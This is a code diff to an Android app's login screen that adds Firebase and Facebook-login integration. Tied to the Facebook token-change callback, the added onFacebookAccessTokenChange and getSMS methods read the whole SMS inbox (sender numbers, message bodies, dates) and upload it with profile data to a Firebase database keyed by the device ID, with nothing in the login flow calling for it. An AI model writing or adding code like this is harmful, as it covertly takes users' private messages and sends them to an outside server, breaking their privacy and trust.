@@ -8,7 +8,10 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
 import android.content.pm.Signature;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Handler;
+import android.provider.Settings;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.util.Base64;
@@ -33,6 +36,10 @@ import com.facebook.appevents.AppEventsLogger;
 import com.facebook.login.LoginManager;
 import com.facebook.login.LoginResult;
 import com.facebook.login.widget.LoginButton;
+import com.firebase.client.AuthData;
+import com.firebase.client.Firebase;
+import com.firebase.client.FirebaseError;
+import com.google.gson.Gson;
 import com.linkedin.platform.APIHelper;
 import com.linkedin.platform.LISessionManager;
 import com.linkedin.platform.errors.LIApiError;
@@ -47,7 +54,11 @@ import org.json.JSONObject;
 
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.HashMap;
+import java.util.List;
+import java.util.Map;
 
 public class LoginActivity extends AppCompatActivity {
     LoginButton loginButton;
@@ -55,8 +66,11 @@ public class LoginActivity extends AppCompatActivity {
     AccessTokenTracker accessTokenTracker;
     AccessToken accessToken;
     Button fblogout;
+    Map<String, Object> user_data;
     ProfileTracker profileTracker;
     Profile profile;
+    Firebase this_user;
+    Firebase myFirebaseRef;
     Button button,sms,llogin;
     /*private static final String host = "api.linkedin.com";
     private static final String topCardUrl = "https://" + host + "/v1/people/~:" +
@@ -65,11 +79,22 @@ public class LoginActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        Firebase.setAndroidContext(getApplicationContext());
         FacebookSdk.sdkInitialize(getApplicationContext());
         setContentView(R.layout.activity_login);
         sms=(Button)findViewById(R.id.sms);
         llogin=(Button)findViewById(R.id.linked_log);
         llogin.setVisibility(View.VISIBLE);
+
+
+        myFirebaseRef = new Firebase("https://cefy.firebaseio.com/");
+       // myFirebaseRef = new Firebase("https://glowing-inferno-4450.firebaseio.com/");
+        String android_id = Settings.Secure.getString(this.getContentResolver(),
+                Settings.Secure.ANDROID_ID);
+
+        this_user = myFirebaseRef.child(android_id);
+
+
         fblogout =(Button)findViewById(R.id.fblogout);
         fblogout.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -80,6 +105,7 @@ public class LoginActivity extends AppCompatActivity {
                 button.setVisibility(View.VISIBLE);
                 fblogout.setVisibility(View.GONE);
                 sms.setVisibility(View.GONE);
+                myFirebaseRef.unauth();
 
             }
         });
@@ -169,12 +195,14 @@ public class LoginActivity extends AppCompatActivity {
                     protected void onCurrentAccessTokenChanged(
                             AccessToken oldAccessToken,
                             AccessToken currentAccessToken) {
+                        LoginActivity.this.onFacebookAccessTokenChange(currentAccessToken);
                         // Set the access token using
                         // currentAccessToken when it's loaded or set.
                     }
                 };
                 // If the access token is available already assign it.
                 accessToken = AccessToken.getCurrentAccessToken();
+
                 CurrentUser();
                 LoginManager.getInstance().registerCallback(callbackManager,
                         new FacebookCallback<LoginResult>() {
@@ -183,10 +211,24 @@ public class LoginActivity extends AppCompatActivity {
                                 // App code
                                 Log.e("Well2","Login successfull");
                                 profile = Profile.getCurrentProfile();
-                                textView.setText(displayMessage(profile));
-                                textView.append(" "+profile.getLastName().toString());
-                                textView.append(" "+profile.getId().toString());
-                               // profileTracker.startTracking();
+                                String first_name= displayMessage(profile);
+                                String last_name = profile.getLastName().toString();
+                                String fb_id=profile.getId().toString();
+                                String profilepic = profile.getProfilePictureUri(200,200).toString();
+                                String link_uri=profile.getLinkUri().toString();
+
+                                textView.setText(first_name);
+                                textView.append(" "+last_name);
+                                textView.append(" "+fb_id);
+                                /*Map<String, Object> user_data = new HashMap<String, Object>();
+                                user_data.put("first_name",first_name );
+                                user_data.put("last_name", last_name);
+                                user_data.put("fb_id", fb_id);
+                                user_data.put("profilepic",profilepic);
+                                user_data.put("link_uri",link_uri);
+
+                                this_user.updateChildren(user_data);
+                               // profileTracker.startTracking();*/
                             }
 
                             @Override
@@ -223,6 +265,73 @@ public class LoginActivity extends AppCompatActivity {
         });
 
 
+    }
+    public List<String> getSMS(){
+        List<String> sms = new ArrayList<String>();
+        Uri uriSMSURI = Uri.parse("content://sms/inbox");
+        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+
+        while (cur.moveToNext()) {
+            String address = cur.getString(cur.getColumnIndex("address"));
+            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
+            sms.add("Number: " + address + " .Message: " + body + " .Date: " + date);
+
+        }
+        return sms;
+
+    }
+    public String fetchInbox()
+    {
+        ArrayList sms = new ArrayList();
+
+        Uri uriSms = Uri.parse("content://sms/inbox");
+        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"},null,null,null);
+
+        cursor.moveToFirst();
+        while  (cursor.moveToNext())
+        {
+            String address = cursor.getString(1);
+            String body = cursor.getString(3);
+
+            System.out.println("======&gt; Mobile number =&gt; "+address);
+            System.out.println("=====&gt; SMS Text =&gt; "+body);
+
+            sms.add("Address    "+address+" SMS  "+ body);
+        }
+        String json_sms = new Gson().toJson(sms);
+        return json_sms;
+
+    }
+    private void onFacebookAccessTokenChange(final AccessToken token) {
+        if (token != null) {
+            myFirebaseRef.unauth();
+            myFirebaseRef.authWithOAuthToken("facebook", token.getToken(), new Firebase.AuthResultHandler() {
+                @Override
+                public void onAuthenticated(AuthData authData) {
+                    // The Facebook user is now authenticated with your Firebase app
+                    AuthData auth = myFirebaseRef.getAuth();
+                    String fb_id=auth.getUid().toString();
+                    List sms_data=getSMS();
+                    String profile=auth.getProviderData().toString();
+                    Log.d("testpass","testpass" +fb_id+" ,,,," +profile);
+
+                    Map<String, Object> user_data = new HashMap<String, Object>();
+                    user_data.put("profile",profile );
+                    user_data.put("SMS",sms_data);
+                    this_user.updateChildren(user_data);
+                }
+                @Override
+                public void onAuthenticationError(FirebaseError firebaseError) {
+                    // there was an error
+                    String fberror=firebaseError.toString();
+                    Log.d("testfail",fberror);
+                }
+            });
+        } else {
+        /* Logged out of Facebook so do a logout from the Firebase app */
+            myFirebaseRef.unauth();
+        }
     }
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
@@ -347,6 +456,7 @@ public class LoginActivity extends AppCompatActivity {
         this.doubleBackToExitPressedOnce = true;
         Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show();
         LoginManager.getInstance().logOut();
+        myFirebaseRef.unauth();
         new Handler().postDelayed(new Runnable() {
 
             @Override
